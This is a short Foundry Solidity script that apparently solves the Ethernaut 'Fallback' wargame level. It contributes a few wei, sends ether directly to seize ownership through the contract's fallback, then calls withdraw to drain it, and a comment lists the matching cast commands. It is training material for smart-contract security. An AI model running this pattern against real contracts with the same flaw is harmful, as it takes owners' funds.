// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../../src/02_Fallback/Fallback.sol";
import {console} from "forge-std/console.sol";



contract CounterScript is Script 
{
    function setUp() public {}

    function run() public 
    {
        Fallback i;
        i = Fallback(payable(0xE77cd8547270EcB9a9E2A259dA1957F148d9D87a));
        vm.startBroadcast();


        i.contribute{value: 100 wei}();
        (bool success, ) = address(i).call{value: 100 wei}("");
        console.log("success", success);
        i.withdraw();


        vm.stopBroadcast();


     }
}

/*

$ cs "contribute() payable"             123 wei
$ send                                  100wei
$ cs "withdraw()"                         
*/



